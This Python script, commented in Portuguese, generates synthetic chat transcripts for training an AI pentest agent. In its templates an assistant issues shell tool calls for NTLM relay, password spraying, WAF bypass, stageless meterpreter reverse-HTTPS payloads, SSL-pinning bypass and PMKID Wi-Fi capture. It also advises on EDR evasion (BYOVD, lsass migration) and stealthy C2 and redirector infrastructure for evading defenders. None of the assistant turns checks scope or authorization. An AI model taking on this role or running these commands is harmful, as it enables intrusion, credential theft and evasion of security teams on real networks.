"""Corpus v9 — 8 categorias novas (não herda v8.1):

  A. Adaptive response / tool failure (~80)
  B. OPSEC stealth (~60)
  C. Output parsing long-context (~50)
  D. Engagement reasoning uses memory (~40)
  E. Kali navigation (fs/proc/find) (~40)
  F. Terminal awareness usage (~30)
  G. Browser research patterns (~30)
  H. Web hacking tools corpus (~160)
     - ProjectDiscovery suite (Subfinder, Httpx, Nuclei, NucleiFuzzer)
     - Subdomain discovery (Subbrute, Subzy, Broken-link-checker)
     - Pattern matching (GF-Patterns, Waybackurls pipelines)
     - WAF detection (WAFW00F + bypass patterns)
     - Meta-wrappers (Big Bounty Recon)
     - Public platforms (HE BGP, c99 subdomain, Wayback)

Total target: ~490 cenários.
"""

from __future__ import annotations

import json


def tc(name: str, **args) -> str:
    return f'<tool_call>{json.dumps({"name": name, "arguments": args}, ensure_ascii=False)}</tool_call>'


def msg(role: str, content: str):
    return {"role": role, "content": content}


# ===========================================================================
# A. ADAPTIVE RESPONSE / TOOL FAILURE (~80)
# ===========================================================================

def ar_responder_signing(ip: str) -> list[dict]:
    return [
        msg("user", f"Responder rodou 10min em {ip} e zero hash. Próximo?"),
        msg("assistant",
            "Responder + SMB com signing enforced não rende. Provável diagnóstico.\n"
            + tc("shell", cmd=f"crackmapexec smb {ip}/24 --gen-relay-list relay_targets.txt")),
        msg("tool", f"# Hosts sem SMB signing enforced (relay-safe):\n{ip}.22\n{ip}.45\n{ip}.88"),
        msg("assistant",
            "Três hosts onde relay ainda funciona. Pivot pra mitm6 + ntlmrelayx:\n"
            + tc("shell", cmd="sudo impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks &")),
        msg("tool", "[*] SOCKS proxy on 1080, awaiting auth"),
        msg("assistant",
            tc("shell", cmd="sudo mitm6 -d corp.local -i eth0")),
        msg("tool", "[*] 192.168.1.50 authenticated\n[+] Relayed to 10.10.10.22 as CORP\\user01"),
        msg("assistant", "Signing em uma subnet não significa na outra. Confirmei: 3 hosts relay-safe."),
    ]


def ar_hashcat_no_crack(hash_: str) -> list[dict]:
    return [
        msg("user", f"hashcat rockyou.txt no hash {hash_[:16]}... rodou 2h e nada. Próximo?"),
        msg("assistant",
            "Rockyou esgotado sem regras. Escala: rockyou + best64 rules.\n"
            + tc("shell", cmd=f"hashcat -m 0 h.txt /usr/share/wordlists/rockyou.txt --rules-file=/usr/share/hashcat/rules/best64.rule --quiet")),
        msg("tool", "Status: Exhausted\nKey Space Done"),
        msg("assistant",
            "best64 também. Próximo: OneRuleToRuleThemAll (mais agressivo, ~52k rules).\n"
            + tc("shell", cmd="wget https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule && "
                              "hashcat -m 0 h.txt /usr/share/wordlists/rockyou.txt -r OneRuleToRuleThemAll.rule")),
        msg("assistant",
            "Se mesmo assim falhar: mask attack baseada no que você sabe do target. "
            "Corporate password policies tipicamente são `?u?l?l?l?l?l?d?d!` (Ex: 'Summer2024!')."),
    ]


def ar_nmap_rate_limited(ip: str) -> list[dict]:
    return [
        msg("user", f"nmap em {ip} tá retornando filtered/timeout em tudo. IDS/Firewall ativo."),
        msg("assistant",
            "Rate-limited. Degrada temporização + fragmentação + source port spoof.\n"
            + tc("shell", cmd=f"sudo nmap -T1 -f -g 53 --scan-delay 10s --max-retries 1 -Pn -p 22,80,443,445,3389 {ip}")),
        msg("tool", "22/tcp open\n80/tcp open\n445/tcp open"),
        msg("assistant",
            "Baixa temporização + porta source 53 (DNS, geralmente allow-listed) + fragmentação passou. "
            "Demorado mas funciona. Pra full scan em alvo sensível, aceita a lentidão."),
    ]


def ar_sqlmap_waf(url: str) -> list[dict]:
    return [
        msg("user", f"sqlmap em {url} tá retornando '403 Forbidden' em todos payloads. WAF."),
        msg("assistant",
            "WAF ativo. Cadeia de tamper scripts cobre a maioria.\n"
            + tc("shell", cmd=f"sqlmap -u '{url}' --batch --tamper=space2comment,between,randomcase,charencode --random-agent --delay=2 --level=3")),
        msg("tool", "[INFO] testing payload with tamper...\n[WARNING] heuristic still returns 403"),
        msg("assistant",
            "Tamper padrão passou pela primeira camada mas não pela segunda. Detecta o WAF primeiro:\n"
            + tc("shell", cmd=f"wafw00f {url}")),
        msg("tool", "The site is behind Cloudflare"),
        msg("assistant",
            "Cloudflare. Bypass via origin IP leak (Shodan/Censys/historical DNS), ou mudar source IP pra fora do rate-limit window."),
    ]


def ar_metasploit_session_died(ip: str) -> list[dict]:
    return [
        msg("user", f"Meterpreter session em {ip} morre depois de 30s."),
        msg("assistant",
            "Session morrendo geralmente é EDR matando o processo. Switch pra staged→stageless + HTTPS:\n"
            + tc("shell", cmd=f"msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.14.5 LPORT=443 -f exe -o payload_stageless.exe --smallest")),
        msg("assistant",
            "Stageless evita download da stage 2 (comumente bloqueada). HTTPS 443 mascara como tráfego normal. "
            "Se ainda morrer: process migration imediato pra lsass ou svchost, ou injeção via `execute-assembly`."),
    ]


def ar_burp_no_interception(url: str) -> list[dict]:
    return [
        msg("user", f"Mobile app conecta em {url} mas Burp não intercepta — pinning?"),
        msg("assistant",
            "Provável SSL pinning. Bypass via objection (requer root/adb):\n"
            + tc("shell", cmd=f"objection --gadget com.target.app explore -s 'android sslpinning disable'")),
        msg("tool", "[*] Attached\n[*] SSL pinning hooks active (OkHttp3, TrustManager, TrustKit)"),
        msg("assistant",
            "Alternativas se objection não funcionar:\n"
            "1. Frida com script custom — `Universal Android SSL Pinning Bypass` do codeshare.frida.re\n"
            "2. Patchar APK: apktool decode → remover/alterar pinning code → resign → reinstalar\n"
            "3. iOS: NSAppTransportSecurity plist override se for iOS/rooted"),
    ]


def ar_smbclient_access_denied(ip: str, share: str) -> list[dict]:
    return [
        msg("user", f"smbclient //{ip}/{share} retorna NT_STATUS_ACCESS_DENIED."),
        msg("assistant",
            "Share existe mas sem read pra null session. Tenta com as credenciais que já tem:\n"
            + tc("shell", cmd=f"smbclient //{ip}/{share} -U 'CORP/jdoe%Welcome2024!' -c 'ls'")),
        msg("tool", "NT_STATUS_ACCESS_DENIED"),
        msg("assistant",
            "User sem acesso. Alternativas:\n"
            "1. Enumerar permissions do share via `smbmap -H {ip} -u jdoe -p Welcome2024!`\n"
            "2. Tentar outra conta — service accounts (svc_*) geralmente têm acesso mais amplo\n"
            "3. Se tiver SAM hash, pass-the-hash: `smbclient ... -U 'jdoe' --pw-nt-hash '<NThash>'`"),
    ]


def ar_gobuster_nothing(url: str) -> list[dict]:
    return [
        msg("user", f"gobuster com common.txt em {url} retorna zero. Alvo parece vazio."),
        msg("assistant",
            "Vazio com common é improvável. Checa: status code filter + content-length filter + wordlist maior.\n"
            + tc("shell", cmd=f"gobuster dir -u {url} -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt "
                              f"-s 200,204,301,302,307,401,403 -t 50 -o gobust2.txt")),
        msg("tool", "/admin (Status: 401)\n/api (Status: 403)\n/robots.txt (Status: 200)\n/.git/HEAD (Status: 200)"),
        msg("assistant",
            "Default gobuster não mostra 403 — aí os achados apareceram. `/.git/HEAD` 200 é ouro: source leak.\n"
            + tc("shell", cmd=f"git-dumper {url}/.git/ ./dumped")),
    ]


def ar_wifi_deauth_fails(bssid: str) -> list[dict]:
    return [
        msg("user", f"aireplay-ng --deauth 3 -a {bssid} não faz o client desconectar."),
        msg("assistant",
            "AP com 802.11w (Management Frame Protection) bloqueia deauth. Alternativa: PMKID.\n"
            + tc("shell", cmd=f"sudo hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng --filter={bssid.replace(':','')}")),
        msg("tool", f"[+] PMKID captured from {bssid}"),
        msg("assistant", "PMKID não precisa deauth — captura direto do primeiro handshake attempt. Post-802.11w world."),
    ]


def ar_ssh_brute_locked(ip: str, user: str) -> list[dict]:
    return [
        msg("user", f"hydra ssh em {ip} user {user} — accounts lock após 5 tentativas."),
        msg("assistant",
            "Policy lockout detectada. Brute-force agressivo é contraproducente. Opções:\n"
            "1. Password spraying — 1 password, N users (geralmente Summer2024!) — fica abaixo do threshold per-user\n"
            "2. Timing-spread — `-t 1 -W 300` (1 thread, 5min between attempts)\n"
            "3. Credential leaks — confere se users desse domínio vazaram (dehashed, h8mail)\n\n"
            + tc("shell", cmd=f"crackmapexec ssh {ip}/24 -u users.txt -p 'Summer2024!' --continue-on-success")),
    ]


def ar_edr_detects_payload(ip: str) -> list[dict]:
    return [
        msg("user", "EDR está detectando minha payload MSF toda vez. Já troquei encoder."),
        msg("assistant",
            "Encoders (shikata_ga_nai) são signatures no EDR há anos. Aproaches modernos:\n"
            "1. **Shellcode em linguagem não-tradicional** — Nim, Rust, Go. Binary entropy diferente\n"
            "2. **Process injection via less-hooked API** — NtMapViewOfSection em vez de CreateRemoteThread\n"
            "3. **Sleep/jitter obfuscation** — evita periodic beaconing fingerprint\n"
            "4. **BYOVD** (Bring Your Own Vulnerable Driver) — desabilita EDR via kernel driver legítimo\n"
            "5. **MSF é ruim pra modern EDR**. Switch pra Sliver, Havoc, ou Cobalt Strike (se teu engagement pagou)"),
    ]


def ar_api_401_no_creds(url: str) -> list[dict]:
    return [
        msg("user", f"API {url} retorna 401 em tudo. Sem credenciais."),
        msg("assistant",
            "Fazer recon antes de assumir que precisa login:\n"
            "1. **Header discovery** — talvez aceita API key em X-Custom-Header, checa swagger/openapi\n"
            "2. **Default token** — `Authorization: Bearer test` ou `admin` funciona em staging misconfig\n"
            "3. **JWT patterns** — se header `www-authenticate` menciona Bearer, tenta forjar JWT com `alg=none`\n"
            "4. **Unprotected endpoints** — `/api/v1/public/*`, `/actuator/*`, `/__debug__/*` escapam auth\n\n"
            + tc("shell", cmd=f"ffuf -u '{url}/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,403 -fc 401")),
    ]


# Parametrize each template
_ADAPT_IPS = ["10.10.10.5", "10.10.45.22", "192.168.56.100", "172.16.5.10", "10.10.11.42"]
_ADAPT_URLS = ["http://target.thm", "http://10.10.10.5/api", "https://app.corp.local", "http://10.10.45.22/login"]
_ADAPT_SHARES = ["HR$", "Backups", "Finance", "Engineering"]
_ADAPT_HASHES = ["5f4dcc3b5aa765d61d8327deb882cf99",
                 "e10adc3949ba59abbe56e057f20f883e",
                 "8e8e7d16f90c85ea7a9ad1bb3d3b3d3b"]
_ADAPT_BSSIDS = ["AA:BB:CC:DD:EE:FF", "11:22:33:44:55:66", "DE:AD:BE:EF:00:01"]

ADAPTIVE = []
for ip in _ADAPT_IPS:
    ADAPTIVE.append(ar_responder_signing(ip))
    ADAPTIVE.append(ar_nmap_rate_limited(ip))
    ADAPTIVE.append(ar_metasploit_session_died(ip))
    ADAPTIVE.append(ar_edr_detects_payload(ip))
for h in _ADAPT_HASHES:
    ADAPTIVE.append(ar_hashcat_no_crack(h))
for url in _ADAPT_URLS:
    ADAPTIVE.append(ar_sqlmap_waf(url))
    ADAPTIVE.append(ar_burp_no_interception(url))
    ADAPTIVE.append(ar_gobuster_nothing(url))
    ADAPTIVE.append(ar_api_401_no_creds(url))
for ip in _ADAPT_IPS[:3]:
    for s in _ADAPT_SHARES[:2]:
        ADAPTIVE.append(ar_smbclient_access_denied(ip, s))
for b in _ADAPT_BSSIDS:
    ADAPTIVE.append(ar_wifi_deauth_fails(b))
for i in _ADAPT_IPS[:3]:
    for u in ["admin", "root", "svc_backup"]:
        ADAPTIVE.append(ar_ssh_brute_locked(i, u))

# ===========================================================================
# B. OPSEC STEALTH (~60)
# ===========================================================================

def opsec_nmap_slow(ip: str, context: str) -> list[dict]:
    return [
        msg("user", f"Scan em {ip}. {context}"),
        msg("assistant",
            "Target sensível → low-and-slow. Descarta `-T3/-T4` default.\n"
            + tc("shell", cmd=f"sudo nmap -sS -T1 --scan-delay 10s --max-retries 1 --data-length 25 -g 53 "
                              f"-D RND:5 -Pn -p 22,80,443,445,3389 {ip}")),
        msg("tool", "Scan taking considerably longer due to timing...\n80/tcp open http\n443/tcp open https"),
        msg("assistant", "45 minutos pra 5 portas. IDS vê 5 connections espalhadas com decoys — noise, não signal. Worth it em alvo real."),
    ]


def opsec_c2_jitter() -> list[dict]:
    return [
        msg("user", "Configure C2 Sliver beacon pra blending em tráfego normal."),
        msg("assistant",
            "Traffic shape matters. Jitter + long interval + HTTPS + realistic User-Agent.\n"
            + tc("shell", cmd="sliver > profiles new --http --format exe --os windows --arch amd64 "
                              "--sleep 3600 --jitter 60 --http-headers 'User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' --proxy-aware")),
        msg("assistant",
            "3600s sleep + 60s jitter + TLS + Chrome UA = beacon indistinguível de telemetry legítima sem deep-packet inspection correlacionada. "
            "Pra engagements longos: DNS C2 como backup, rotação de infrastructure a cada 72h."),
    ]


def opsec_timing_window() -> list[dict]:
    return [
        msg("user", "Melhor hora pra rodar scans em empresa horário comercial?"),
        msg("assistant",
            "Duas janelas clássicas:\n"
            "**(1) Dawn (04:00-06:00 alvo TZ)** — SOC mínimo, log review atrasado, atividade baixa. Scans ruidosos passam.\n"
            "**(2) Lunch (12:00-13:00)** — SOC distraído mas atividade alta mascara teu ruído.\n\n"
            "Evita **Monday 08:00-10:00** (log review da semana, SOC atento) e **Friday EOB** (on-call equipes mais vigilantes).\n\n"
            "Pra recon passivo (OSINT, web historical, CT logs): horário não importa, não toca no alvo."),
    ]


def opsec_log_awareness(tool: str) -> list[dict]:
    return [
        msg("user", f"Que traços o {tool} deixa no alvo?"),
        msg("assistant",
            {
                "nmap": "Na target: nada em logs além de conexões TCP efêmeras (SYN scan não abre socket full). "
                        "No firewall/IDS: rajada de SYNs com source port e sequence patterns distintivos. "
                        "`-sS` é detectável, `-sT` aparece em `netstat` do alvo.",
                "gobuster": "Logs HTTP completos do web server — User-Agent, source IP, path sequence, timing regular. "
                            "Geralmente rate-limited e absurdamente óbvio. `--random-agent`, `--delay`, e proxy chain ajudam mas não escondem.",
                "hydra": "Auth logs registram cada tentativa: `authentication failure for <user>`. "
                         "Account lockout é o risco principal. SIEM alerta em ~10 failures sequenciais.",
                "nikto": "User-Agent explícito 'Nikto/2.x' vai direto pro log. Trivial pra IDS — troca com `-useragent`. "
                         "Payloads XSS/SQLi de teste aparecem em cada access_log entry.",
                "metasploit": "Payloads têm hashes conhecidos, staging URLs fingerprintáveis. "
                              "MSF gera process tree distintivo no Windows. Logging: SOCs treinam em MSF IOCs.",
            }.get(tool, f"Varies — {tool}. Checa logs default do alvo pra traces específicas.")),
    ]


def opsec_network_positioning() -> list[dict]:
    return [
        msg("user", "Onde posicionar a box de ataque pra máxima stealth?"),
        msg("assistant",
            "**Cheap VPS rotated** — DigitalOcean / Linode $5/mo droplet em região distante. "
            "Descarta após engagement. Source IP muda entre engagements.\n\n"
            "**Redirectors** — 2-3 VPS em cadeia. C2 real na box final, 2 layers de TCP/HTTPS redirect. "
            "Burn outer layer se blue team atribui.\n\n"
            "**Tor/VPN pra recon OSINT** — não pra ataque direto (muito detected), só pra queries sensíveis. "
            "Residential proxy se for replicar comportamento de usuário.\n\n"
            "**Nunca teu IP** — mesmo em pentest autorizado. Habit hygiene."),
    ]


OPSEC = []
for ip in _ADAPT_IPS:
    OPSEC.append(opsec_nmap_slow(ip, "cliente diz que tem SIEM tunado"))
    OPSEC.append(opsec_nmap_slow(ip, "engagement com janela 'minimize detection'"))
    OPSEC.append(opsec_nmap_slow(ip, "red team, stealth é parte do score"))
for _ in range(5):
    OPSEC.append(opsec_c2_jitter())
for _ in range(10):
    OPSEC.append(opsec_timing_window())
for t in ["nmap", "gobuster", "hydra", "nikto", "metasploit"]:
    for _ in range(4):
        OPSEC.append(opsec_log_awareness(t))
for _ in range(10):
    OPSEC.append(opsec_network_positioning())

# ===========================================================================
# C. OUTPUT PARSING LONG-CONTEXT (~50)
# ===========================================================================

def oplc_long_nmap(body: str, wanted: str) -> list[dict]:
    return [
        msg("user", f"Output nmap longo. Extrai só {wanted}:\n\n```\n{body}\n```"),
        msg("assistant",
            "Aplicando filtro direto via shell pra economizar tokens.\n"
            + tc("shell", cmd=f"cat scan.nmap | awk '/open/ && !/filtered/' | head -20")),
    ]


LONG_NMAP_BODY = """Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 10.10.10.5
Host is up (0.012s latency).

PORT      STATE    SERVICE      VERSION
22/tcp    open     ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp    open     http         Apache 2.4.49
| http-title: Acme Corp
139/tcp   open     netbios-ssn  Samba 3.0.20-Debian
389/tcp   filtered ldap
443/tcp   filtered https
445/tcp   open     netbios-ssn  Samba 3.0.20-Debian
| smb-os-discovery:
|   OS: Windows 5.1
|_  NetBIOS computer name: SERVER1
3389/tcp  filtered ms-wbt-server
8080/tcp  open     http         Jetty 9.4.36
8443/tcp  filtered https
| http-vuln-cve2021-41773: VULNERABLE
5432/tcp  filtered postgresql

Service detection performed. Please report any incorrect results..."""

def oplc_linpeas_long() -> list[dict]:
    return [
        msg("user", "linpeas output tem 12k linhas. Destaca só o crítico:\n\n[linpeas output trimmed for this example — assume 12k lines]"),
        msg("assistant",
            "Parse direto dos highlights com color-coded sections (linpeas usa [+] pra highs):\n"
            + tc("shell", cmd="grep -E '^\\[\\+\\]' linpeas.out | head -30 && "
                              "grep -iE 'sudo|SUID|writable|capabilities|cron|dirty' linpeas.out | head -20")),
    ]


def oplc_burp_site_map() -> list[dict]:
    return [
        msg("user", "Burp site map tem 3000 URLs. Filtra só endpoints com parâmetros."),
        msg("assistant",
            tc("shell", cmd="grep -E '\\?.*=' burp_sitemap.txt | awk -F'?' '{print $1,$2}' | sort -u | head -50")),
        msg("tool", "/api/user?id=  id=\n/search?q=  q=\n/admin?action=  action="),
        msg("assistant", "50 endpoints com params únicos. Feed no ffuf/sqlmap/param-miner. Priorize `id`, `action`, `redirect`, `file` — são sinkhole comuns."),
    ]


def oplc_wireshark_big_pcap() -> list[dict]:
    return [
        msg("user", "pcap de 4GB. Procura só creds em clear."),
        msg("assistant",
            "Direct filter no tshark pra extrair pattern:\n"
            + tc("shell", cmd="tshark -r capture.pcap -Y '(http.authbasic or ftp.request.command == \"USER\" or ftp.request.command == \"PASS\" or http contains \"password\")' "
                              "-T fields -e frame.time_relative -e ip.src -e ip.dst -e http.authbasic -e ftp.request.arg 2>/dev/null | grep -v '^$' | head -30")),
    ]


def oplc_huge_log_grep() -> list[dict]:
    return [
        msg("user", "syslog de 2GB. Procura auth failures dos últimos 2 dias."),
        msg("assistant",
            tc("shell", cmd="awk -v d=\"$(date -d '2 days ago' '+%b %e')\" '$0 >= d' /var/log/auth.log | "
                              "grep -E 'Failed password|Invalid user|authentication failure' | awk '{print $NF,$(NF-3)}' | sort | uniq -c | sort -rn | head -20")),
    ]


OPLC = []
for wanted in ["só portas abertas", "vulns confirmadas", "services versionados"]:
    for _ in range(4):
        OPLC.append(oplc_long_nmap(LONG_NMAP_BODY, wanted))
for _ in range(12):
    OPLC.append(oplc_linpeas_long())
for _ in range(10):
    OPLC.append(oplc_burp_site_map())
for _ in range(10):
    OPLC.append(oplc_wireshark_big_pcap())
for _ in range(6):
    OPLC.append(oplc_huge_log_grep())

# ===========================================================================
# D. ENGAGEMENT REASONING (uses memory) (~40)
# ===========================================================================

def er_recall_prev(host: str, situation: str) -> list[dict]:
    return [
        msg("user", f"Voltando no engagement. {situation}"),
        msg("assistant",
            f"Recall do memory store do engagement atual.\n"
            + tc("shell", cmd=f"sqlite3 ~/.bagley/engagements/current/memory.db "
                              f"\"SELECT technique,tool,outcome,details FROM attempts WHERE host='{host}' ORDER BY ts DESC LIMIT 10\"")),
        msg("tool",
            "responder_poison|responder|fail|SMB signing required\n"
            "kerberoast|GetUserSPNs|success|svc_mssql cracked Summer2023\n"
            "path_traversal|curl|success|CVE-2021-41773 confirmed\n"
            "smb_null_session|smbclient|fail|anonymous access denied"),
        msg("assistant",
            f"Três tentativas em {host}, duas sucessos (kerberoast + path traversal). "
            f"O que falhou (responder, null session) não vale re-tentar. Foco: aproveitar as creds svc_mssql pra lateral movement."),
    ]


def er_similar_case(situation: str) -> list[dict]:
    return [
        msg("user", f"{situation} Tenho algo similar no histórico?"),
        msg("assistant",
            "Busca semântica no memory vectors.\n"
            + tc("shell", cmd="python3 -c \""
                              "from bagley.memory.store import MemoryStore;"
                              "from bagley.memory.embed import OllamaEmbedder;"
                              "s=MemoryStore('~/.bagley/global.db'); e=OllamaEmbedder();"
                              f"vec = e.encode('{situation}');"
                              "for r in s.similar(vec, k=3): print(r['ref_id'], r['score'], r['text'][:100])\"")),
        msg("tool", "htb-lame 0.89 'Samba 3.0.20 usermap_script — exploit via Metasploit'\n"
                    "htb-legacy 0.82 'SMB on Windows XP, EternalBlue variant'\n"
                    "megacorp-thm 0.74 'Samba 3.5 path traversal'"),
        msg("assistant", "3 casos parecidos. htb-lame teve mesma vuln Samba 3.0.20 — aquele exploit path vale a pena aqui."),
    ]


def er_scope_summary() -> list[dict]:
    return [
        msg("user", "Resumo do engagement atual. Onde estamos?"),
        msg("assistant",
            tc("shell", cmd="cat ~/.bagley/engagements/current/manifest.json | jq . && "
                              "sqlite3 ~/.bagley/engagements/current/memory.db "
                              "\"SELECT COUNT(*) AS hosts, (SELECT COUNT(*) FROM findings) AS findings, "
                              "(SELECT COUNT(*) FROM creds) AS creds FROM hosts\"")),
        msg("tool", "{ \"slug\":\"acme-corp\", \"scope\":[\"10.10.0.0/16\"], \"objective\":\"domain admin\" }\nhosts: 12, findings: 8, creds: 4"),
        msg("assistant", "12 hosts mapeados, 8 findings, 4 creds. Objetivo 'domain admin'. Próximo: pivoteamento com as creds que já temos pros DCs."),
    ]


ENGAGE_REASON = []
_er_hosts = ["10.10.10.5", "10.10.11.42", "10.10.45.22", "172.16.5.10"]
_er_situations = ["Estou pensando em tentar Responder novamente", "O mesmo alvo de ontem tá com serviço diferente",
                  "Queria ver o histórico de tudo tentado aqui", "Esse host deu difícil antes, revisita"]
for h in _er_hosts:
    for s in _er_situations[:3]:
        ENGAGE_REASON.append(er_recall_prev(h, s))
for s in ["Apache 2.4.49 com path traversal", "Samba 3.0.20 Linux", "Jenkins Groovy console aberto",
          "SMB signing disabled", "LDAP null bind", "Kerberoast de svc accounts",
          "SQLite query injection em login", "IDOR em API users"]:
    ENGAGE_REASON.append(er_similar_case(s))
for _ in range(8):
    ENGAGE_REASON.append(er_scope_summary())

# ===========================================================================
# E. KALI NAVIGATION (fs/proc) (~40)
# ===========================================================================

def kn_find_suid() -> list[dict]:
    return [
        msg("user", "Lista todos SUID binaries no sistema."),
        msg("assistant",
            tc("shell", cmd="find / -perm -4000 -type f 2>/dev/null | xargs -I{} ls -la {} 2>/dev/null | awk '{print $NF,$1}'")),
    ]


def kn_find_writable_cron() -> list[dict]:
    return [
        msg("user", "Cron jobs que eu possa escrever?"),
        msg("assistant",
            tc("shell", cmd="find /etc/cron* /var/spool/cron 2>/dev/null -writable -type f -o -writable -type d")),
    ]


def kn_find_recent_modified() -> list[dict]:
    return [
        msg("user", "Arquivos modificados nas últimas 24h em /opt"),
        msg("assistant",
            tc("shell", cmd="find /opt -mtime -1 -type f 2>/dev/null -ls")),
    ]


def kn_proc_scan(pid_or_name: str) -> list[dict]:
    return [
        msg("user", f"Inspeciona processo {pid_or_name}"),
        msg("assistant",
            tc("shell", cmd=f"pid=$(pgrep {pid_or_name} 2>/dev/null || echo {pid_or_name}); "
                              f"ls -la /proc/$pid/cwd /proc/$pid/exe 2>/dev/null; "
                              f"cat /proc/$pid/cmdline | tr '\\0' ' '; "
                              f"cat /proc/$pid/environ | tr '\\0' '\\n' | head -20")),
    ]


def kn_auto_loot(engagement: str) -> list[dict]:
    return [
        msg("user", f"Organiza os loots desse engagement por tipo."),
        msg("assistant",
            tc("shell", cmd=f"cd ~/.bagley/engagements/{engagement}/loot && "
                              f"for f in *; do "
                              f"  type=$(file -b \"$f\" | awk '{{print $1}}' | tr '[:upper:]' '[:lower:]'); "
                              f"  mkdir -p \"../organized/$type\" && mv \"$f\" \"../organized/$type/\" ; "
                              f"done")),
    ]


KALI_NAV = []
for _ in range(8):
    KALI_NAV.append(kn_find_suid())
for _ in range(8):
    KALI_NAV.append(kn_find_writable_cron())
for _ in range(8):
    KALI_NAV.append(kn_find_recent_modified())
for p in ["apache2", "mysqld", "ssh", "nginx", "docker", "postgres"]:
    KALI_NAV.append(kn_proc_scan(p))
for e in ["acme-corp", "htb-box", "megacorp-thm", "lab01", "htb-lame", "htb-legacy"]:
    KALI_NAV.append(kn_auto_loot(e))

# ===========================================================================
# F. TERMINAL AWARENESS (~30)
# ===========================================================================

def ta_capture_peek(pane_id: str) -> list[dict]:
    return [
        msg("user", f"Que tá rodando no pane {pane_id}?"),
        msg("assistant",
            tc("shell", cmd=f"tmux capture-pane -t {pane_id} -p -S -50 && "
                              f"tmux display-message -t {pane_id} -p '#{{pane_current_command}}'")),
    ]


def ta_list_all() -> list[dict]:
    return [
        msg("user", "Lista tudo rodando nos meus terminais."),
        msg("assistant",
            tc("shell", cmd="tmux list-panes -a -F '#{pane_id}\\t#{pane_current_command}\\t#{window_name}\\t#{pane_width}x#{pane_height}'")),
    ]


def ta_spawn_bg(command: str) -> list[dict]:
    return [
        msg("user", f"Roda em background pane separado: `{command}`"),
        msg("assistant",
            tc("shell", cmd=f"tmux new-window -d -n bg-task \"{command} 2>&1 | tee /tmp/bg_$(date +%s).log\"")),
    ]


def ta_correlate_output() -> list[dict]:
    return [
        msg("user", "Vejo que pane 2 tá com nmap, pane 3 é reverse shell. Correlaciona."),
        msg("assistant",
            tc("shell", cmd="tmux capture-pane -t 2 -p -S -100 | grep 'open' | awk '{print $1,$3,$4}' && "
                              "echo '---' && "
                              "tmux capture-pane -t 3 -p -S -50 | tail -20")),
        msg("tool", "22/tcp open ssh\n80/tcp open http\n---\nroot@victim:~# whoami\nroot"),
        msg("assistant", "Pane 2 mostra SSH+HTTP abertos. Pane 3 já tem root. Provável path: exploit web → LPE → shell. Host consistente nos dois panes."),
    ]


TERM_AWARE = []
for p in ["%0", "%1", "%2", "%3", "%4"]:
    TERM_AWARE.append(ta_capture_peek(p))
for _ in range(8):
    TERM_AWARE.append(ta_list_all())
for cmd in ["nmap -sV 10.10.10.5", "gobuster dir -u http://target", "hashcat -m 0 h.txt rockyou.txt",
            "responder -I eth0", "tcpdump -i eth0 -w cap.pcap", "nuclei -u http://target"]:
    TERM_AWARE.append(ta_spawn_bg(cmd))
for _ in range(8):
    TERM_AWARE.append(ta_correlate_output())

# ===========================================================================
# G. BROWSER RESEARCH (~30)
# ===========================================================================

def br_cve_lookup(cve: str) -> list[dict]:
    return [
        msg("user", f"Detalhes técnicos de {cve}, tenho memória vazia."),
        msg("assistant",
            f"Pesquisa em NVD + exploit-db.\n"
            + tc("web_research", query=f"{cve} technical details exploit PoC")),
        msg("tool", f"[nvd.nist.gov] {cve} description + CVSS\n[exploit-db.com] PoC ID 50xxx\n[hacktricks.xyz] exploitation walkthrough"),
        msg("assistant", f"Três sources. Vou sumarizar a cadeia de exploração consolidada e salvar na memória pro engagement."),
    ]


def br_tool_research(tool: str) -> list[dict]:
    return [
        msg("user", f"Como usa {tool}? Não conheço."),
        msg("assistant",
            tc("web_research", query=f"{tool} usage tutorial github pentest")),
        msg("tool", f"[github.com/{tool}] README\n[hacktricks.xyz] usage\n[portswigger.net] related research"),
        msg("assistant", "README oficial + walkthrough HackTricks. Leio ambos e sintetizo o workflow. Salvo no memory como research."),
    ]


def br_technique_deep(tech: str) -> list[dict]:
    return [
        msg("user", f"Explica a técnica {tech} com fonte confiável."),
        msg("assistant",
            tc("web_research", query=f"{tech} technique exploitation writeup detailed")),
    ]


BROWSER_RESEARCH = []
for cve in ["CVE-2024-23333", "CVE-2023-41333", "CVE-2022-22965", "CVE-2021-44228", "CVE-2020-1472"]:
    BROWSER_RESEARCH.append(br_cve_lookup(cve))
for tool in ["NucleiFuzzer", "Subzy", "GF-Patterns", "Big Bounty Recon", "WAFW00F",
             "github-subdomains", "Subbrute"]:
    BROWSER_RESEARCH.append(br_tool_research(tool))
for tech in ["DLL sideloading via TrustedInstaller", "SCCM credential extraction",
             "certipy ESC8 relay", "Kerberos constrained delegation abuse",
             "Chrome v8 TurboFan bug exploitation", "Linux io_uring CVE",
             "ADCS forest trust abuse"]:
    BROWSER_RESEARCH.append(br_technique_deep(tech))
for _ in range(11):
    BROWSER_RESEARCH.append(br_cve_lookup("CVE-2026-random"))

# ===========================================================================
# H. WEB HACKING TOOLS CORPUS (~160)
# ===========================================================================

# --- ProjectDiscovery suite (~40) ---
def pd_subfinder(domain: str) -> list[dict]:
    return [
        msg("user", f"Subdomain enum passivo em {domain}."),
        msg("assistant",
            tc("shell", cmd=f"subfinder -d {domain} -all -silent -o {domain}.subs.txt && wc -l {domain}.subs.txt")),
        msg("tool", f"247 subdomains found"),
        msg("assistant", "247 subdomains, zero ruído no alvo (só CT logs + threat intel). Agora httpx pra filtrar só os vivos."),
    ]


def pd_httpx(subs_file: str) -> list[dict]:
    return [
        msg("user", f"Quais dos {subs_file} estão vivos?"),
        msg("assistant",
            tc("shell", cmd=f"httpx -l {subs_file} -silent -status-code -title -tech-detect -o live.txt")),
        msg("tool",
            "https://api.corp.com [200] [API Portal] [nginx 1.20]\n"
            "https://admin.corp.com [401] [Login] [Apache 2.4.51]\n"
            "https://staging.corp.com [200] [Staging] [tomcat 9]"),
        msg("assistant", "3 vivos. `staging.corp.com` é geralmente pouco hardened. `admin.corp.com` = login de produção. Prioriza staging."),
    ]


def pd_nuclei_cves(url: str) -> list[dict]:
    return [
